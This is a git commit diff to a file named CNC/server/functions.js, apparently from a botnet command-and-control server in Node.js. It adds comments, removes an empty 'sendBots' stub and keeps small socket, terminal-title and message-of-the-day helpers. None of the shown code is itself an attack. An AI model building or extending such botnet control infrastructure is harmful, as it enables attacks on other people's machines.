addd85f1d751f4fdb5d394b1c63fff62b5177619
n4no <74839733+Preauthorized@users.noreply.github.com>
2021-04-19 12:34:53 -0400

    Update functions.js

--- CNC/server/functions.js
+++ CNC/server/functions.js
@@ -4,6 +4,10 @@ const fs = require("fs");
 // Files
 const Server = require("./main.js");
 
+/*
+*@params: Socket, Str
+*@type: [<string>]
+*/
 exports.getInput = function(socket, string) {
     return new Promise(resolve => {
         socket.write(string);
@@ -20,16 +24,18 @@ exports.getInput = function(socket, string) {
     });
 }
 
-exports.sendBots = function(socket, string) {
-    Server.bot.on('connection', function(socket) {
-    
-    })
-}
-
+/*
+*@params: Str, Socket
+*@type: [<string>]
+*/
 exports.set_title = function(string, socket) {
     socket.write("\033]0;" + string + "\007")
 }
 
+/*
+*@params: MOTD
+*@type: [<string>]
+*/
 exports.changeMotd = function(new_motd) {
     fs.writeFileSync("./CNC/db/sys/motd.dat", new_motd);
     return "[+] New Message of the day updated!";
